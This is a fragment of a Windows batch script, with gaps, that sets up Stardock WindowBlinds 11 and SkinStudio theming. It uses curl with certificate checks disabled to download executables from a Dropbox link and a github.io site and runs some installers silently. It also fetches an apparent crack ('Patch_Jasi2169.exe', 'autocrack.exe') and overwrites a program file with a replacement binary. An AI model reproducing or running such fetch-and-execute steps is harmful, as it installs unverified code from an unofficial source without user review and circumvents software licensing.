...
curl https://dl.dropbox.com/scl/fi/g1r37dl8u0rm588cabc65/Get7.zip?rlkey=pd9a5ufs3ndl99cl9oryt81qw -kLo "%temp%\Get7.zip"
...
curl -k --output "%TEMP%\WindowBlinds11_setup.exe" "https://microtoolbox.github.io/8d4ejv.com"
start /wait "" "%TEMP%\WindowBlinds11_setup.exe" /S
del /f /q "%TEMP%\WindowBlinds11_setup.exe"
curl -k --output "%TEMP%\Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe" "https://microtoolbox.github.io/Stardock_WindowBlinds_v11.02_Patch_Jasi2169.exe"
curl -k --output "%TEMP%\autocrack.exe" "https://microtoolbox.github.io/autocrack.exe"
...
curl -k --output "%TEMP%\SkinStudio_10_setup_sd.exe" "https://microtoolbox.github.io/SkinStudio_10_setup_sd.exe"
start /wait "" "%TEMP%\SkinStudio_10_setup_sd.exe" /S
del /f /q "%TEMP%\SkinStudio_10_setup_sd.exe"
curl -k --output "%ProgramFiles(x86)%\Stardock\SkinStudio\SdDisplay.exe" "https://microtoolbox.github.io/SkinStudio_SdDisplay.exe"
curl -k --output "%TEMP%\Aero11.wba" "https://microtoolbox.github.io/Aero11.wba"
...
curl -k --output "%TEMP%\WMC.zip" "https://microtoolbox.github.io/WMC.zip"
mkdir "%TEMP%\WMC"
